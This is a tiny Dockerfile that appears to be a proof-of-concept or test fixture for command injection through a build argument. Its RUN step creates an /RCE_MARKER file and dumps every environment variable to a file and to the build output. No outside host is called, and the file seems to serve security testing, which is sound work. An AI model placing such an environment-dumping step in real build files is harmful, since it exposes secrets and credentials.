FROM alpine
ARG PYTHON_VERSION
RUN echo "Injected version: $PYTHON_VERSION" && sh -c "touch /RCE_MARKER && env > /env_dump && cat /env_dump"
